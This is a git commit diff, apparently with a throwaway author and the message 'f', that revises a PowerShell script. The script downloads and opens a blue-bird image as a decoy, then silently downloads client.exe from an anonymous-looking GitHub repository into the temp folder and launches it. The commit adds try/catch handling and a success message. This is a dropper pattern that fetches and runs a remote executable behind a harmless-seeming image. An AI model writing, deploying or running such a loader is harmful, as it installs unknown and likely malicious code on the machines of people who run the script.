4af58470fce51296b35e38f5feca19a7639d16aa
Your Name <you@example.com>
2025-02-16 10:52:20 -0800

    'f'

--- script-ps.ps1
+++ script-ps.ps1
@@ -1,13 +1,18 @@
-# Download the image # #
-Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
+try {
+    # Download the image
+    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
 
-# Open the downloaded image
-Start-Process "$env:TEMP\blue-bird.jpg"
+    # Open the downloaded image
+    Start-Process "$env:TEMP\blue-bird.jpg"
 
-# Download the client.exe file
-$exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
-$exePath = "$env:TEMP\client.exe"
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+    # Download the client.exe file
+    $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
+    $exePath = "$env:TEMP\client.exe"
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-# Run the downloaded client.exe
-Start-Process $exePath
+    # Run the downloaded client.exe
+    Start-Process $exePath -ErrorAction Stop
+    Write-Host "client.exe launched successfully."
+} catch {
+    Write-Host "An error occurred: $_"
+}
